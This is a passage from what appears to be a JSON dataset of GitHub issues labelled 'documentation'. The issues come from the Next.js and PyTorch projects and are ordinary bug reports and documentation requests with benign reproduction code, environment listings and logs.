Reproduce\r\n\r\nhttps://codesandbox.io/s/next9-getinitialprops-bug-f1lj7\r\n\r\n## Expected behavior\r\n\r\n`req` and `res` should have content.\r\n\r\n## Screenshots\r\n\r\nServer logs:\r\n![image](https://user-images.githubusercontent.com/47538444/60831940-bec95300-a188-11e9-8a10-9db79335d396.png)\r\n\r\n## System information\r\n\r\n- OS: MacOS / Linux (codesandbox + node:10-alpine tested)\r\n- server-side issue\r\n- Version of Next.js: 9.0.0\r\n"},{"labels":["documentation",null],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nDynamic route params are not available during SSR or when exporting pages in combination with `useRouter`\r\n\r\n## To Reproduce\r\n\r\n1. Set up the [dynamic routing example](https://github.com/zeit/next.js/tree/canary/examples/dynamic-routing)\r\n2. Add a `console.log(id)` statement to the `/post/[id]/index.js` page.\r\n3. The console output when navigating to /post/first **by clicking a link** is correctly `first`.\r\n4. However, **when reloading** http://localhost:3000/post/first, the console output will be `undefined` and _then_ `first`. Also the SSR'd source will be different from the client-side render.\r\n5. (The same behavior will show on statically exported pages)\r\n\r\n## Expected behavior\r\n\r\n`useRouter` should also return the correct query when running server-side or during export.\r\n\r\nIt should still re-render statically exported pages including additional query params however!\r\n\r\n## System information\r\n\r\n- OS: macOS\r\n- Version of Next.js: 9.0.0\r\n"},{"labels":[null,"documentation"],"text":"Hi,\r\nWould like to request for documentation using breakpoint/debugging. \r\nSeems some of the recommended ways on the internets are out of date now (on Spectrum / SO, etc..). \r\nSome documentation from Zeit would be awesome.."},{"labels":["documentation"],"text":"Hi! I've just started reading the docs. This link is broken (missing):\r\n\r\n![Screen Shot 2019-03-13 at 08 03 01](https://user-images.githubusercontent.com/20521892/54263378-9b8af000-4568-11e9-9a8f-49fed316b740.png)\r\n\r\n\r\nI think it's important because it's the very first basic example provided in the documentation and this can drive people away. "},{"labels":["documentation"],"text":"Could you please add api reference to the documentation with a detailed description of each method for each entity? To go through the documentation without the ability to see immediately available api, spoils the blood.\r\nAs here https://reactjs.org/docs/react-api.html or here https://vuejs.org/v2/api/\r\nAttempting to sort out and collect piece of information from the documentation, learn, and source code and types, spends a lot of time"},{"labels":["documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nSetting the config distDir to a directory outside your Next project causes page titles to render in the browser and not server side.\r\n\r\n## To Reproduce\r\n\r\nI cloned the material-ui next esample to reproduce this but its not necessary:\r\nhttps://github.com/mui-org/material-ui/tree/master/examples/nextjs\r\n\r\nIf you make a simple Next app with a custom _app.js and _document.js and pages/index.js you can test this (those files may not even be needed honestly). make a next.config.js and set the distDir to some directory outside the Next project directory:\r\n\r\n// next.config.js\r\n```\r\nmodule.exports = {distDir: '../functions/next'};\r\n\r\n```\r\n\r\ncopy all your Next dependencies into that directory and run npm install. Go back to your Next directory and build your next app. change the head in a few places and test it out, it will never server side render your page titles.\r\n\r\n\r\n## Expected behavior\r\nPage titles should always be server side rendered if possible, regardless of the distDir config\r\n\r\n## Screenshots\r\nIf applicable, add screenshots to help explain your problem.\r\n\r\n## System information\r\n - Version of Next.js: 7.0.2\r\n\r\n## Additional context\r\n"},{"labels":[null,"documentation"],"text":"# Feature request\r\n\r\n## Is your feature request related to a problem? Please describe.\r\n\r\nThere's quite a bit of confusion on how Next.js handles routing as is slightly different from most routing frameworks out there. The reason for this is that Next.js by design has a constraint that we won't ship a routes manifest of every possible route in the application.\r\n\r\n## Describe the solution you'd like\r\n\r\nI've written a pretty complete comment about how `<Link>` works with custom parameters etc. It can be found here: https://github.com/zeit/next.js/issues/2833#issuecomment-414919347\r\n\r\nMost of that comment can be used in the docs.\r\n"},{"labels":["documentation"],"text":"Filed using the bug report template as there is no issue template for documentation/website issues (maybe there should be an issue for that)\r\n\r\n## Describe the bug\r\nThere is currently no real documentation for `next/router`, the closest thing is a brief section that is for some reason located under https://nextjs.org/docs/#intercepting-popstate \r\n\r\n## To Reproduce\r\n1. Look for documentation on usage of `next/router`\r\n2. Notice there is no documentation on the full API and usage of `next/router`\r\n\r\n## Expected behavior\r\nThere is documentation on the full API and usage of `next/router`\r\n\r\n"},{"labels":["documentation"],"text":"> Currently it doesn't explain what Component and Container do, and what props they take, if any.\r\n\r\n#4145"},{"labels":["documentation"],"text":"Hi,\r\n\r\nCould you recommend us the best practices to deploy applications in production with nextjs?\r\n\r\nWe are thinking in strategies like: canary deployment, blue/green deployment... We have several doubts to handle BUILD_ID.\r\n\r\nRight now, with this kind of strategies we are facing with this error: INVALID_BUILD_ID, because in some moment of the deployment we have at least two different versions of the application.\r\n\r\nfor example:\r\n\r\nOn a Canary deployment, at one point we have 2 differents versions, The balancer send a client to \r\nversion A, but then when the client need other resources, the balancer could send this request to a \r\nserver with version B. At this point the client receive an 500 error when the app fetch resources like serp.js, _error.js, _document.js, and the webpage is not loaded correctly.\r\n\r\n\r\n_next/f6bff019-9550-4029-99fa-2b33a50045f6/page/index.js  ---> old (previous deployment)\r\n\r\n_next/005b2202-c5b2-4de6-afd8-1c8451d16ab3/page/index.js  ---> new (current deployment)\r\n\r\n\r\nUntil now, we have tested:\r\n\r\n1. Rename the BUILD_ID to have the same hash in both versions, but we think is a bad practice, because we think that the client's cache will not be refreshed how is expected.\r\n2. Sticky sessions is the most reliable, but we are handle a stateless app as an app with state, and really is not true.\r\n3. We could put on front a CDN that caches the BUILD_ID, but we are not sure that the time we should assign for the cache of the js files.\r\n\r\nKind regards,"},{"labels":[null,"documentation"],"text":"It is not clear how to effectively optimise the usage and bundling of many assets within a next.js application. Typically webpack offers great power around this as you can use various loader chains to reference, load and optimise assets in place. Since the docs say to avoid adding webpack loaders when manipulating the configuration it isn't so obvious how we should go about managing assets and optimisation of those assets in an efficient manner.\r\n\r\nThere are two main parts that I see which I would love to see solutions and documentation for:\r\n\r\n1. How do we avoid having to maintain a large global assets folder as opposed to keeping assets close to where they are actually needed? I've seen the babel-plugin suggestion however it strikes me as counter-intuitive that a babel plugin is hitting the filesystem and especially emitting new files. This seems absolutely like the job for the bundler and/or framework (what I see next.js as). *This also has the caveat that it only works for imports from js modules whereas the power we get from webpack to have any file references (ie. css `url()`) detected and managed within the dependency graph is a huge win.*\r\n2. How should we optimise these assets when building or developing a next.js application?\r\n\r\nIs it on the roadmap to improve the asset management story of next.js? The more decisions about this stuff that can be moved away from user code (great example being needing to prefix CDN urls manually) the better."},{"labels":["documentation"],"text":"In Slack and in issues there comes repeatedly the question of how to do stuff differently server-side vs. client-side. I added a note in Wiki related to this: https://github.com/zeit/next.js/wiki/FAQ but it's obviously not clear enough.\r\n\r\nI think it would be nice to add to README:\r\n- that e.g in `getInitialProps` you can use `process.browser` var to check where you are (which AFAIK is better than `!!ctx.req` because this one still returns `true` on the first client-side render...?)\r\n- that `componentDidMount` only runs client-side, so can add client-only code there. More generally, precise which React lifecycle methods are client-only.\r\n- or suggest to use something like <NoSSR> component in render, or other libraries which render server-side only above-the-fold (link to examples, e.g https://github.com/zeit/next.js/tree/master/examples/progressive-render?)\r\n- note that these should hopefully be exceptions, and it's nice to strive for code which is as universal as possible"},{"labels":["documentation"],"text":"A quick brain dump of all the questions that arose while getting started with `next.js`. Some of these might be answered already and I just haven't looked hard enough. \r\n\r\n## How `next.js` improves performance\r\nAs I see it a major responsibility of the `next.js` build process and server is performance improvements.\r\nSome are documented and some not and there doesn't seem to be a central place to look up all that is done.\r\n\r\nI'd like to see a comprehensive list (possibly with reasoning and resources) of all the steps the build process and server takes inherently (e.g. compression, HTTP headers, minification, code splitting, etc.). And also steps it doesn't take (yet), pitfalls and configuration/extensions that the end user might have to implement by themselves. The Wiki might be a good place for such a list.\r\n\r\n## Configuration File\r\nThe `README.md`'s [custom configuration](https://github.com/zeit/next.js#custom-configuration) section seems incomplete in terms of describing what keys the exported object from `next.config.js` accepts. Based on present documentation there is only one key `webpack`. Is that all there is for the moment?\r\n\r\n## Programmatic API\r\nA start to document `next.js`' programmatic API is taken in section [Custom server and routing](https://github.com/zeit/next.js#custom-server-and-routing) of `README.md`. What I'm missing is proper documentation for instance methods like `getRequestHandler()`, `render()` etc.\r\n\r\n---\r\n\r\nI'm more than happy to help with improvements but would like some suggestions and pointers from somebody more familiar with the matter. Also maybe the community has more points to add to the list.\r\n\r\n> Documentation is like sex: when it is good, it is very, very good; and when it is bad, it is better than nothing."},{"labels":[null,"documentation",null,null],"text":"Maybe some simpler type annotations can be introduced.\r\nCurrently it's `kernel_size: Union[T, Tuple[T, ...]], stride: Optional[Union[T, Tuple[T, ...]]]`, and it's hard to parse, especially since it's so comon and clutters the signatures. Can we introduce some type alias `int_or_inttuple` or something in this spirit?\r\n\r\n![image](https://user-images.githubusercontent.com/1041752/93633775-c8d31c80-f9ef-11ea-81ce-4e8d11b1aff3.png)\r\n\n\ncc @jlin27 @ezyang @malfet @rgommers @xuzhao9 @gramster"},{"labels":["documentation",null,null,null],"text":"## 🐛 Bug\r\n\r\nPytorch documentation: https://pytorch.org/docs/stable/optim.html#torch.optim.SGD\r\n\"This is in contrast to Sutskever et. al. and other frameworks which employ an update of the form\"\r\n![image](https://user-images.githubusercontent.com/4337024/93537302-022c5f00-f900-11ea-9a98-fa83a7b90654.png)\r\n\r\nSGD: http://proceedings.mlr.press/v28/sutskever13.pdf\r\n![image](https://user-images.githubusercontent.com/4337024/93537287-f9d42400-f8ff-11ea-9535-42d1eafb92f1.png)\r\n\r\nAs an implication both the adapted and the interpreted version of SGD have negative momentum\r\n\r\n\n\ncc @jlin27 @vincentqb"},{"labels":[null,"documentation",null,null],"text":"## 🐛 Bug\r\n\r\nFollowing an (adapted) version of the example provided in the docs for [`emit_nvtx`](https://pytorch.org/docs/stable/autograd.html#torch.autograd.profiler.emit_nvtx) produces the following error:\r\n\r\n```Python\r\nTraceback (most recent call last):\r\n  File \"test.py\", line 9, in <module>\r\n    with torch.autograd.profiler.emit_nvtx():\r\n  File \"/scratch/mattle/.conda/lib/python3.7/site-packages/torch/autograd/profiler.py\", line 553, in __enter__\r\n    False\r\nRuntimeError: Profiler is already enabled on this thread\r\n```\r\n\r\n\r\n\r\n## To Reproduce\r\n\r\n```Python\r\nimport torch\r\n\r\nprint(f'Version = {torch.__version__}')\r\n\r\nx = torch.rand(100, 100, device='cuda')\r\n\r\nwith torch.autograd.profiler.profile():\r\n    temp = x * x\r\n    with torch.autograd.profiler.emit_nvtx():\r\n        temp = x * x\r\n```\r\n\r\nYields the following output:\r\n\r\n```Python\r\nVersion = 1.6.0\r\nTraceback (most recent call last):\r\n  File \"test.py\", line 9, in <module>\r\n    with torch.autograd.profiler.emit_nvtx():\r\n  File \"/scratch/mattle/.conda/lib/python3.7/site-packages/torch/autograd/profiler.py\", line 553, in __enter__\r\n    False\r\nRuntimeError: Profiler is already enabled on this thread\r\n```\r\n\r\n## Expected behavior\r\n\r\nNo error\r\n\r\n## Environment\r\n\r\n```\r\nCollecting environment information...\r\nPyTorch version: 1.6.0\r\nIs debug build: False\r\nCUDA used to build PyTorch: 10.1\r\nROCM used to build PyTorch: N/A\r\n\r\nOS: Ubuntu 18.04.3 LTS (x86_64)\r\nGCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0\r\nClang version: Could not collect\r\nCMake version: version 3.10.2\r\n\r\nPython version: 3.7 (64-bit runtime)\r\nIs CUDA available: True\r\nCUDA runtime version: 10.1.243\r\nGPU models and configuration: \r\nGPU 0: Quadro GP100\r\nGPU 1: Quadro GP100\r\n\r\nNvidia driver version: 418.116.00\r\ncuDNN version: Could not collect\r\nHIP runtime version: N/A\r\nMIOpen runtime version: N/A\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.19.1\r\n[pip3] numpydoc==1.1.0\r\n[pip3] torch==1.6.0\r\n[conda] blas                      1.0                         mkl  \r\n[conda] cudatoolkit               10.1.243             h6bb024c_0  \r\n[conda] mkl                       2020.2                      256  \r\n[conda] mkl-service               2.3.0            py37he904b0f_0  \r\n[conda] mkl_fft                   1.1.0            py37h23d657b_0  \r\n[conda] mkl_random                1.1.1            py37h0573a6f_0  \r\n[conda] numpy                     1.19.1           py37hbc911f0_0  \r\n[conda] numpy-base                1.19.1           py37hfa32c7d_0  \r\n[conda] numpydoc                  1.1.0                     <pip>\r\n[conda] pytorch                   1.6.0           py3.7_cuda10.1.243_cudnn7.6.3_0    pytorch\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0): 1.6.0\r\n - OS (e.g., Linux): Linux\r\n - How you installed PyTorch (`conda`, `pip`, source): conda\r\n - Build command you used (if compiling from source):\r\n - Python version: 3.7.9\r\n - CUDA/cuDNN version:\r\n - GPU models and configuration:\r\n - Any other relevant information:\r\n\n\ncc @ezyang @albanD @zou3519 @gqchen @pearu @nikitaved @jlin27"},{"labels":["documentation",null,null],"text":"Update the [main doc page for sparse](https://pytorch.org/docs/master/sparse.html). What is needed includes at least:\r\n\r\n- remove the legacy constructors (`torch.sparse.FloatTensor` et al.), use `torch.sparse_coo_tensor` instead and explain it's a regular `Tensor` instance:\r\n\r\n```\r\n>>> s = torch.sparse_coo_tensor(indices=[[0, 3]], \r\n...                             values=[[1, 2], [3, 4]], \r\n...                             size=(4, 2))                               \r\n>>> s                                                                      \r\ntensor(indices=tensor([[0, 3]]),\r\n       values=tensor([[1, 2],\r\n                      [3, 4]]),\r\n       size=(4, 2), nnz=2, layout=torch.sparse_coo)\r\n>>> type(s)                                                                \r\n<class 'torch.Tensor'>\r\n```\r\n\r\n- do not use any private methods (e.g. `._indices()` --> `.indices()`).\r\n- add docstrings to sparse-specific methods (e.g. `coalesce()`, `is_coalesced()`.\r\n- explain the main purpose(s) of sparse tensors. for example, the word \"memory\" is not present on the page right now.\r\n- explain the purpose of the `torch.sparse` namespace (which is, hold functions where the \"unspecified elements are 0\" assumption doesn't hold or somehow sparse/dense don't have the same behaviour).\r\n- explain that functions in the `torch` namespace _may_ support sparse tensors, and give a few representative code examples (e.g. using `torch.bmm`)\r\n- explain the purpose of a hybrid tensor and give more details on it\n\ncc @jlin27 @vincentqb @aocsa @nikitaved @pearu"},{"labels":[null,"documentation",null,null],"text":"I am using this scheduler for my model and the \"verbose\" argument does not seem to exist within the source code of the documentation, even though the summarized documentation has it as an argument. Seems like a typo. \r\n\n\ncc @jlin27 @vincentqb"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nThe code for torch.optim.lr_scheduler.CosineAnnealingWarmRestarts does not take argument \"verbose\" but documentation says otherwise.\r\n\n\ncc @ezyang @zou3519 @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n[From the docs:](https://pytorch.org/docs/stable/generated/torch.norm.html)\r\n\r\n`torch.norm(input, p='fro', dim=None, keepdim=False, out=None, dtype=None)`\r\n\r\n> **dim** (int, 2-tuple of python:ints, 2-list of python:ints, optional) – [...] If the input tensor has more than two dimensions, the vector norm will be applied to last dimension.\r\n\r\nThe docs say that by default the norm will be applied to the last dimension, when the input tensor has more than two axes. I see different behaviour:\r\n```\r\na = torch.rand(3, 4, 5)\r\ntorch.norm(a)\r\n# tensor(4.7850)\r\n```\n\ncc @jlin27"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nFor some C++ functions (for example, torch::load), the [function documentation](https://pytorch.org/cppdocs/api/function_namespacetorch_1a4b369494adfb10b9a005aeb0bb6207cb.html?highlight=load) page shows a warning:  \r\n\r\n```\r\n\"doxygenfunction: Unable to resolve multiple matches for function “torch::load” with arguments (std::vector<torch::Tensor>&, LoadFromArgs&&…) in doxygen xml output for project “PyTorch” from directory: /var/lib/jenkins/workspace/docs/cpp/build/xml.\"\r\n```\r\n\r\n![image](https://user-images.githubusercontent.com/39305301/92850084-9ab57180-f41e-11ea-8e73-47015c71c87e.png)\r\n\n\ncc @yf225 @glaringlee @jlin27"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nhttps://pytorch.org/docs/stable/quantization.html should have clear examples on how to customize `qconfig` objects for assigning custom qconfigs to layers or skipping layers from quantization.\n\ncc @jlin27 @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a @vkuzo"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nExample screenshot on my browser (Firefox 80.0.1, Ubuntu 18.04):\r\n![image](https://user-images.githubusercontent.com/26719449/92656714-86a82d80-f2c1-11ea-86f2-304946746ac7.png)\r\n\r\nSee link:\r\nhttps://pytorch.org/docs/stable/autograd.html#torch.autograd.functional.jacobian\r\n\r\nCurrent commit on `master`: 3674264\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen @jlin27"},{"labels":["documentation",null,null],"text":"## 🐛 Bug\r\n\r\nI have a model trained with BN layers and tracking running parameters ON. After training, I found I couldn't turn the tracking_running_stats off for inference in PT1.6. Everything worked expectedly in PT1.5. \r\nThe results in PT1.6 with tracking_running_stats ON or OFF are the same after Batchnorm which means it always used tracked mean&variance. But PT1.5 can give different outputs for tracking_running_stats ON or OFF which is expected.\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```\r\nimport torch as th\r\nimport numpy as np \r\n\r\ndef turn_off_running_param(m):\r\n\r\n    if isinstance(m, (th.nn.BatchNorm2d, th.nn.InstanceNorm2d)):\r\n        m.track_running_stats=False\r\n\r\nclass sample_module(th.nn.Module):\r\n    def __init__(self, in_ch, out_ch):\r\n        super().__init__()\r\n\r\n        self.conv1_1 = th.nn.Conv2d(in_ch, out_ch, 7, padding=3)\r\n        self.bn = th.nn.BatchNorm2d(out_ch)\r\n        self.nonlinear = th.nn.LeakyReLU(negative_slope=0.2, inplace=True)\r\n\r\n        ### rand buffer \r\n        self.bn.running_mean = (th.ones((out_ch))*100.0)\r\n        self.bn.running_var = (th.ones(out_ch)*1.0)\r\n\r\n    def forward(self, x):\r\n        \r\n        x_conv = self.conv1_1(x)\r\n        x = self.bn(x_conv)\r\n\r\n        return x_conv, x\r\n\r\n\r\nif __name__ == \"__main__\":\r\n\r\n    model = sample_module(3, 4).eval().cuda()\r\n    image = th.rand((1, 3, 4, 4)).cuda()\r\n\r\n    ### BN track_running_stats ON\r\n    conv_out_tracking_on, bn_out_tracking_on = model(image)\r\n\r\n    ### BN track_running_stats OFF\r\n    model.apply(turn_off_running_param)\r\n    conv_out_tracking_off, bn_out_tracking_off = model(image)\r\n\r\n    print(\"Tracking off model:\\n\", model)\r\n    print(\"test pytorch:\", th.__version__)\r\n    if th.mean(th.abs(conv_out_tracking_on - conv_out_tracking_off)) != 0:\r\n        print(\"?????? Different conv output, unexpected!!!\")\r\n        print(\"conv_out_tracking_on:\", conv_out_tracking_on.cpu().data.numpy()[0,0,:,:].tolist())\r\n        print(\"conv_out_tracking_off:\", conv_out_tracking_off.cpu().data.numpy()[0,0,:,:].tolist())\r\n    else:\r\n        print(\"### Same conv output, expected!!!\")\r\n\r\n    if th.mean(th.abs(bn_out_tracking_on - bn_out_tracking_off)) != 0:\r\n        print(\"### Different BN outputs, expected!!!\")\r\n        print(\"bn_out_tracking_on:\", bn_out_tracking_on.cpu().data.numpy()[0,0,:,:].tolist())\r\n        print(\"bn_out_tracking_off:\", bn_out_tracking_off.cpu().data.numpy()[0,0,:,:].tolist())\r\n    else:\r\n        print(\"?????? Same BN output, unexpected!!!\")\r\n```\r\n\r\n\r\n/************************ TEST *********************************/\r\n\r\n/*********** PT1.6 results ************/\r\n(dgxenv) [yuecheng@pit101-dgx123 care_garage]$ python bn_test.py \r\n```\r\nTracking off model:\r\n sample_module(\r\n  (conv1_1): Conv2d(3, 4, kernel_size=(7, 7), stride=(1, 1), padding=(3, 3))\r\n  (bn): BatchNorm2d(4, eps=1e-05, momentum=0.1, affine=True, track_running_stats=False)\r\n  (nonlinear): LeakyReLU(negative_slope=0.2, inplace=True)\r\n)\r\ntest pytorch: 1.6.0\r\n### Same conv output, expected!!!\r\n?????? Same BN output, unexpected!!!\r\n```\r\n\r\n\r\n/*********** PT1.5 results ************/\r\n(pt1.5_for_yuecheng) [yuecheng@pit101-dgx123 care_garage]$ python bn_test.py \r\n```\r\nTracking off model:\r\n sample_module(\r\n  (conv1_1): Conv2d(3, 4, kernel_size=(7, 7), stride=(1, 1), padding=(3, 3))\r\n  (bn): BatchNorm2d(4, eps=1e-05, momentum=0.1, affine=True, track_running_stats=False)\r\n  (nonlinear): LeakyReLU(negative_slope=0.2, inplace=True)\r\n)\r\ntest pytorch: 1.5.1\r\n### Same conv output, expected!!!\r\n### Different BN outputs, expected!!!\r\nbn_out_tracking_on: [[-100.20112609863281, -100.19847869873047, -99.9124526977539, -99.82685089111328], [-100.03643798828125, -100.18742370605469, -100.01443481445312, -100.0298843383789], [-100.31416320800781, -100.27574920654297, -100.29280090332031, -99.8615493774414], [-100.10736083984375, -100.09064483642578, -100.03619384765625, -100.07273864746094]]\r\nbn_out_tracking_off: [[-0.7678689956665039, -0.7493481636047363, 1.24749755859375, 1.8450984954833984], [0.3819170296192169, -0.6721907258033752, 0.5355216860771179, 0.4277057647705078], [-1.557004690170288, -1.2887893915176392, -1.4078713655471802, 1.6028516292572021], [-0.11317643523216248, 0.0034803077578544617, 0.38364145159721375, 0.12853538990020752]]\r\n\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0): PT1.5, PT1.6\r\n - OS (e.g., Linux): Linux\r\n - How you installed PyTorch (`conda`, `pip`, source): conda\r\n - Build command you used (if compiling from source): conda install pytorch torchvision cudatoolkit=10.1 -c pytorch\r\n - Python version:3.7.8 \r\n - CUDA/cuDNN version: CUDA 10.1\r\n - GPU models and configuration: \r\n - Any other relevant information:\r\n\r\n\n\ncc @jlin27 @albanD @mruberry"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n'torch.per_channel_symmetric — per tensor, symmetric'  supposed to be\r\n'torch.per_channel_symmetric — per channel, symmetric' \r\nin docs/source/quantization-support.rst Line  320.\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\n\ncc @jlin27 @jerryzh168 @jianyuh @dzhulgakov @raghuramank100 @jamesr66a @vkuzo"},{"labels":["documentation",null,null],"text":"## 🐛 Bug\r\n\r\n`mean` and `var` overflow on CPU and GPU for `float` and `half`. (only cuda half is good)\r\n\r\nAlso, torch.var is not supported on CPU for half type\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```python\r\nimport torch\r\nimport itertools\r\n\r\nprint(torch.__version__)\r\n\r\ndef test(dtype, device):\r\n    print(dtype, device)\r\n\r\n    if dtype == torch.float:\r\n        num = 3e38  # 3.4e38\r\n    elif dtype == torch.half:\r\n        num = 40000 # 65535\r\n\r\n    a = torch.tensor([num, num, num], dtype=dtype, device=device)\r\n    print('data', a)\r\n\r\n    b = a.mean()\r\n    print('mean', b)\r\n\r\n    if dtype == torch.half and device == 'cpu':\r\n        # RuntimeError: _th_var not supported on CPUType for Half\r\n        print()\r\n        return\r\n\r\n    c = a.var()\r\n    print('var', c)\r\n\r\n    print()\r\n\r\n\r\nfor dtype, device in itertools.product(\r\n    [torch.half, torch.float],\r\n    ['cpu', 'cuda']):\r\n\r\n    test(dtype, device)\r\n```\r\n\r\nOutput\r\n```\r\n1.7.0a0+06c277f\r\ntorch.float16 cpu\r\ndata tensor([40000., 40000., 40000.], dtype=torch.float16)\r\nmean tensor(inf, dtype=torch.float16)\r\n\r\ntorch.float16 cuda\r\ndata tensor([40000., 40000., 40000.], device='cuda:0', dtype=torch.float16)\r\nmean tensor(40000., device='cuda:0', dtype=torch.float16)\r\nvar tensor(0., device='cuda:0', dtype=torch.float16)\r\n\r\ntorch.float32 cpu\r\ndata tensor([3.0000e+38, 3.0000e+38, 3.0000e+38])\r\nmean tensor(inf)\r\nvar tensor(inf)\r\n\r\ntorch.float32 cuda\r\ndata tensor([3.0000e+38, 3.0000e+38, 3.0000e+38], device='cuda:0')\r\nmean tensor(inf, device='cuda:0')\r\nvar tensor(inf, device='cuda:0')\r\n```\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\nNo overflow\r\n\r\n## Environment\r\n\r\n```\r\n$ python -m torch.utils.collect_env\r\nCollecting environment information...\r\nPyTorch version: 1.7.0a0+06c277f\r\nIs debug build: False\r\nCUDA used to build PyTorch: 11.0\r\n\r\nOS: Fedora 31 (Workstation Edition) (x86_64)\r\nGCC version: (GCC) 8.3.1 20190223 (Red Hat 8.3.1-2)\r\nClang version: 7.0.1 (Fedora 7.0.1-6.fc29)\r\nCMake version: version 3.15.3\r\n\r\nPython version: 3.7 (64-bit runtime)\r\nIs CUDA available: True\r\nCUDA runtime version: Could not collect\r\nGPU models and configuration: GPU 0: GeForce RTX 2070 SUPER\r\nNvidia driver version: 450.51.05\r\ncuDNN version: Probably one of the following:\r\n/usr/lib64/libcudnn.so.8.0.1\r\n/usr/lib64/libcudnn_adv_infer.so.8.0.1\r\n/usr/lib64/libcudnn_adv_train.so.8.0.1\r\n/usr/lib64/libcudnn_cnn_infer.so.8.0.1\r\n/usr/lib64/libcudnn_cnn_train.so.8.0.1\r\n/usr/lib64/libcudnn_ops_infer.so.8.0.1\r\n/usr/lib64/libcudnn_ops_train.so.8.0.1\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.17.3\r\n[pip3] torch==1.7.0a0+06c277f\r\n[pip3] torchvision==0.8.0a0+446eac6\r\n[conda] Could not collect\r\n```\r\n\r\n## Additional context\r\n\r\nIf someone is going to fix this by using a higher level dtype for accumulation (e.g. half -> float, float -> double), please make sure to also run benchmarks. \r\n\r\ncc @jlin27 @zasdfgbnm \r\n"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nhttps://github.com/pytorch/pytorch/blob/f8f35fddd4b2bd788953d6d6ccfadf690b73a3e8/torch/_torch_docs.py#L4273-L4286\r\n\r\nThe following warning can be removed given that https://github.com/pytorch/pytorch/pull/42004 is in.\r\n\r\ncc: @mruberry \n\ncc @jlin27 @mruberry @VitalyFedyunin"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nDear @apaszke,\r\n\r\nI would like to kindly remind you of an matplotlib NameError exception due to matplotlib.pyplot.imshow(). To reproduce this error, you may run [reinforcement_q_learning.ipynb in google colab](https://colab.research.google.com/github/pytorch/tutorials/blob/gh-pages/_downloads/2b3f06b04b5e96e4772746c20fcb4dcc/reinforcement_q_learning.ipynb).\r\n\r\nCheers\n\ncc @jlin27"},{"labels":[null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nEdgecase issue: when using IterableDataset whose total length is `BATCH_SIZE` and `num_workers > 0` is set in DataLoader, tensors with incorrect batch sizes are returned.\r\n\r\n## To Reproduce\r\n\r\n```python\r\nfrom torch.utils.data import DataLoader\r\nfrom torch.utils.data import IterableDataset, get_worker_info\r\nimport math\r\n\r\nclass MyIterableDataset(IterableDataset):\r\n    '''This dataset is copied from PyTorch docs.'''\r\n    def __init__(self, start, end):\r\n        super(MyIterableDataset).__init__()\r\n        assert end > start, \"this example code only works with end >= start\"\r\n        self.start = start\r\n        self.end = end\r\n    def __iter__(self):\r\n        worker_info = get_worker_info()\r\n        if worker_info is None:  # single-process data loading, return the full iterator\r\n            iter_start = self.start\r\n            iter_end = self.end\r\n        else:  # in a worker process\r\n            # split workload\r\n            per_worker = int(math.ceil((self.end - self.start) / float(worker_info.num_workers)))\r\n            worker_id = worker_info.id\r\n            iter_start = self.start + worker_id * per_worker\r\n            iter_end = min(iter_start + per_worker, self.end)\r\n        return iter(range(iter_start, iter_end))\r\n\r\ndef main():\r\n    ds = MyIterableDataset(0, 4)\r\n    dl = DataLoader(ds, batch_size=4, num_workers=2)\r\n    print(next(iter(dl)).shape) # should give 4, but gives 2\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n``` \r\nrun the above script to reproduce issue.\r\n\r\n## Expected behavior\r\n\r\n```\r\n    ds = MyIterableDataset(0, 4)\r\n    dl = DataLoader(ds, batch_size=4, num_workers=2)\r\n    print(next(iter(dl)).shape) # should give 4, but gives 2\r\n\r\n    ds = MyIterableDataset(0, 4)\r\n    dl = DataLoader(ds, batch_size=4, num_workers=4)\r\n    print(next(iter(dl)).shape) # should give 4, but gives 1\r\n\r\n    ds = MyIterableDataset(0, 8)\r\n    dl = DataLoader(ds, batch_size=4, num_workers=4)\r\n    print(next(iter(dl)).shape) # should give 4, works as expected.\r\n```\r\nClearly only happens when dataset length matches batch size. While this might be an edge case, small dataset sizes are frequently used in unit tests; so this matters.\r\n\r\n## Environment\r\n\r\n```\r\nCollecting environment information...\r\nPyTorch version: 1.6.0\r\nIs debug build: False\r\nCUDA used to build PyTorch: None\r\n\r\nOS: Microsoft Windows 10 Enterprise\r\nGCC version: Could not collect\r\nClang version: Could not collect\r\nCMake version: Could not collect\r\n\r\nPython version: 3.7 (64-bit runtime)\r\nIs CUDA available: False\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip3] blendtorch-btb==0.2.0\r\n[pip3] blendtorch-btt==0.2.0\r\n[pip3] numpy==1.19.1\r\n[pip3] torch==1.6.0\r\n[pip3] torchvision==0.7.0\r\n[conda] blas                      1.0                         mkl  \r\n[conda] blendtorch-btt            0.2.0                     dev_0    <develop>\r\n[conda] cpuonly                   1.0                           0    pytorch\r\n[conda] mkl                       2020.2                      256  \r\n[conda] mkl-service               2.3.0            py37hb782905_0  \r\n[conda] mkl_fft                   1.1.0            py37h45dec08_0  \r\n[conda] mkl_random                